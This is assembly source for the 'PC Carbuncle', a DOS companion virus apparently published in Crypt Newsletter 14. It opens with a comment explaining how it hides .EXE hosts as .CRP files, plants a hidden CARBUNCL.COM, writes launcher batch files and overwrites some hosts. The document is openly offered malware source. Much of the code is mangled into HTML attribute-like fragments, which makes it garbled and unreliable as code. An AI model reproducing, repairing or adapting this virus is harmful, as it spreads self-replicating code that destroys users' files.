

;The PC CARBUNCLE VIRUS - a companion virus for Crypt Newsletter 14                
;The PC Carbuncle is a "toy" virus which will search out every .EXEfile
;in the current directory, rename it with a .CRP [for Crypt] extent and
;create a batchfile.  The batchfile calls the PC Carbuncle [which has
;copied itself to a hidden file in the directory], renames the host
;file to its NORMAL extent, executes it, hides it as a .CRP file once
;again and issues a few error messages.  The host files function
;normally. Ocassionaly, the PC Carbuncle will copy itself to a few
;of the host .CRP files, destroying them.  The majority of the host
;files in the PC Carbuncle-controlled directory will continue to function,
;in any case.  If the user discovers the .CRP and .BAT files and is smart
;enough to delete the batchfiles and rename the .CRP hosts to their
;normal .EXE extents, the .CRPfiles which have been infected by the
;virus will re-establish the infection in the directory.
;--Urnst Kouch, Crypt Newsletter 14
		
		.radix 16
     code       segment
		model  small
		assume cs:code, ds:code, es:code

		org 100h
begin:
		jmp     vir_start
		db     'á.šâNst†d‰M–$'      ; name
	      
exit:
		mov     ah, 4Ch              ; exit to DOS
		int     21h
vir_start:
		
		mov     ah,2Ch               ; DOS get system time.                      
		int     21h                  ; <--alter values="" to="" suit="" cmp="" dh,10="" ;="" is="" seconds=""> 10?
		jg      batch_stage          ; if so, be quiet  (jg)
		      ; with the virus counter, this feature arrests the  
					     ; overwriting infection so 
					     ; computing isn't 
					     ; horribly disrupted
					     ; when the virus is about
		mov     al,5                 ; infect only a few files
		mov     count,al             ; by establishing a counter


start:          mov     ah,4Eh                ; <----find first="" file="" of="" recurse:="" mov="" dx,offset="" crp_ext="" ;="" matching="" filemask,="" "*.crp"="" int="" 21h="" ;="" because="" pc="" carbuncle="" has="" ;="" in="" most="" cases,="" already="" created="" ;="" them.="" jc="" batch_stage="" ;="" jump="" on="" carry="" to="" ;="" spawn="" if="" no="" .crpfiles="" found="" mov="" ax,3d01h="" ;="" open="" .crpfile="" r/w="" mov="" dx,009eh="" int="" 21h="" mov="" bh,40h="" ;="" mov="" dx,0100h="" ;="" starting="" from="" beginning="" xchg="" ax,bx="" ;="" put="" handle="" in="" ax="" mov="" cl,2ah="" ;="" to="" write:="" pc="" carbuncle="" int="" 21h="" ;="" write="" the="" virus="" mov="" ah,3eh="" ;="" close="" the="" file="" int="" 21h="" dec="" count="" ;="" take="" one="" off="" the="" count="" jz="" exit="" ;="" and="" exit="" when="" ~3="" files="" ;="" are="" overwritten="" with="" virus="" mov="" ah,4fh="" ;="" find="" next="" file="" jmp="" short="" recurse="" ;="" and="" continue="" until="" all="" .crp="" ;="" files="" converted="" to="" pc="" ;="" carbuncle's="" ret="" batch_stage:="" mov="" dx,offset="" file_create="" ;="" create="" file,="" name="" of="" mov="" cx,0="" ;="" carbuncl.com="" mov="" ah,3ch="" int="" 21h="" ;="" write="" virus="" body="" to="" file="" mov="" bx,ax="" mov="" cx,offset="" last="" -="" offset="" begin="" mov="" dx,100h="" mov="" ah,40h="" int="" 21h="" ;="" close="" file="" mov="" ah,3eh="" ;="" assumes="" bx="" still="" has="" file="" handle="" int="" 21h="" ;="" change="" attributes="" mov="" dx,offset="" file_create="" ;="" of="" created="" file="" to="" mov="" cx,3="" ;(1)="" read="" only="" and="" (2)="" hidden="" mov="" ax,4301h="" int="" 21h="" ;="" get="" dta="" mov="" ah,="" 1ah="" ;="" where="" to="" put="" dta="" lea="" dx,="" [last+90h]="" int="" 21h="" mov="" ah,="" 4eh="" ;="" find="" first="" .exe="" file="" small_loop:="" ;="" to="" carbuncl-ize="" lea="" dx,="" [vict_ext]="" ;="" searchmask,="" *.exe="" int="" 21h="" jc="" exit="" mov="" si,="" offset="" last="" +="" 90h="" +="" 30d="" ;="" save="" name="" mov="" di,="" offset="" orig_name="" mov="" cx,="" 12d="" rep="" movsb="" mov="" si,="" offset="" orig_name="" ;="" put="" name="" in="" bat="" buffer="" mov="" di,="" offset="" bat_name="" mov="" cx,="" 12d="" rep="" movsb="" cld="" mov="" di,="" offset="" bat_name="" mov="" al,="" '.'="" mov="" cx,="" 9d="" repne="" scasb="" push="" cx="" cmp="" word="" ptr="" es:[di-3],'su'="" ;="" useless="" rubbish="" jne="" cont="" mov="" ah,="" 4fh="" jmp="" small_loop="" cont:="" mov="" si,="" offset="" bat_ext="" ;fix="" bat="" mov="" cx,="" 3="" rep="" movsb="" pop="" cx="" mov="" si,="" offset="" blank="" ;further="" fix="" bat="" rep="" movsb="" mov="" si,="" offset="" orig_name="" ;="" fill="" rename="" mov="" di,="" offset="" rename_name="" mov="" cx,="" 12d="" rep="" movsb="" mov="" di,="" offset="" rename_name="" mov="" al,="" '.'="" mov="" cx,="" 9="" repne="" scasb="" push="" cx="" mov="" si,="" offset="" moc_ext="" ;="" fix="" rename="" mov="" cx,="" 3="" rep="" movsb="" pop="" cx="" mov="" si,="" offset="" blank="" ;="" further="" fix="" rename="" rep="" movsb="" ;="" copy="" the="" string="" over="" mov="" di,="" offset="" orig_name="" mov="" al,="" '="" '="" mov="" cx,="" 12="" repne="" scasb="" mov="" si,="" offset="" blank="" ;="" put="" a="" few="" blanks="" rep="" movsb="" mov="" si,="" offset="" orig_name="" ;fill="" in="" the="" created="" batfile="" mov="" di,="" offset="" com1="" mov="" cx,="" 12d="" rep="" movsb="" mov="" si,="" offset="" orig_name="" ;="" more="" fill="" mov="" di,="" offset="" com2="" mov="" cx,="" 12d="" rep="" movsb="" mov="" si,="" offset="" orig_name="" ;="" copy="" more="" fill="" mov="" di,="" offset="" com3="" mov="" cx,="" 12d="" rep="" movsb="" mov="" si,="" offset="" blank="" point_srch:="" dec="" di="" ;="" get="" rid="" of="" an="" annoying="" cmp="" byte="" ptr="" [di],="" 00="" ;="" period="" jne="" point_srch="" rep="" movsb="" mov="" si,="" offset="" rename_name="" ;="" copy="" more="" fill="" mov="" di,="" offset="" moc1="" mov="" cx,="" 12d="" rep="" movsb="" mov="" si,="" offset="" rename_name="" ;="" copy="" still="" more="" fill="" mov="" di,="" offset="" moc2="" mov="" cx,="" 12d="" rep="" movsb="" mov="" dx,="" offset="" orig_name="" ;="" rename="" original="" file="" mov="" di,="" offset="" rename_name="" ;="" to="" new="" .crp="" name="" mov="" ah,="" 56h="" int="" 21h="" mov="" dx,="" offset="" bat_name="" ;="" create="" batfile="" xor="" cx,="" cx="" mov="" ah,="" 3ch="" int="" 21h="" mov="" bx,="" ax="" mov="" cx,="" (offset="" l_bat="" -="" offset="" s_bat)="" ;="" length="" of="" batfile="" mov="" dx,="" offset="" s_bat="" ;="" write="" to="" file="" mov="" ah,="" 40h="" int="" 21h="" mov="" ah,="" 3eh="" ;="" close="" batfile="" int="" 21h="" next_vict:="" mov="" ah,="" 4fh="" ;="" find="" the="" next="" host="" jmp="" small_loop="" ;="" and="" create="" more="" ;="" "controlled"="" .crps="" count="" db="" 90h=""></----find><---count buffer,="" bogus="" value="" crp_ext="" db="" "*.crp",0=""></---count><---- searchmask="" for="" pc="" carbuncle="" file_create="" db="" "carbuncl.com",0=""></----><---carbuncl shadow="" virus="" bat_ext="" db="" "bat"="" vict_ext="" db="" "*.exe",0=""></---carbuncl><----searchmask for="" hosts="" to="" carbuncl-ize="" moc_ext="" db="" "crp"="" ;="" new="" extent="" for="" carbuncl-ized="" hosts="" blank="" db="" "="" "="" ;blanks="" for="" filling="" batchfile="" s_bat:="" db="" "@echo="" off",0dh,0ah="" ;=""></----searchmask><--batchfile command="" lines="" db="" "carbuncl",0dh,0ah="" ;="" call="" pc="" carbuncl="" shadow="" virus="" db="" "rename="" "="" moc1="" db="" 12="" dup="" ('="" '),'="" '="" com1="" db="" 12="" dup="" ('="" '),0dh,0ah="" com2="" db="" 12="" dup="" ('="" '),0dh,0ah="" db="" "rename="" "="" com3="" db="" 12="" dup="" ('="" '),'="" '="" moc2="" db="" 12="" dup="" ('="" '),0dh,0ah="" db="" "carbuncl",0dh,0ah,01ah=""></--batchfile><---put dumb="" message="" here="" l_bat:="" ;="" format="" "echo="" fuck="" you="" lamer"="" note:="" db="" "pc="" carbuncle:="" crypt="" newsletter="" 14",0="" bat_name="" db="" 12="" dup="" ('="" '),0="" ;="" on="" the="" fly="" workspace="" rename_name="" db="" 12="" dup="" ('="" '),0="" orig_name="" db="" 12="" dup="" ('="" '),0="" last:=""></---put><---- end="" of="" virus="" place-holder="" code="" ends="" end="" begin=""></----></--alter>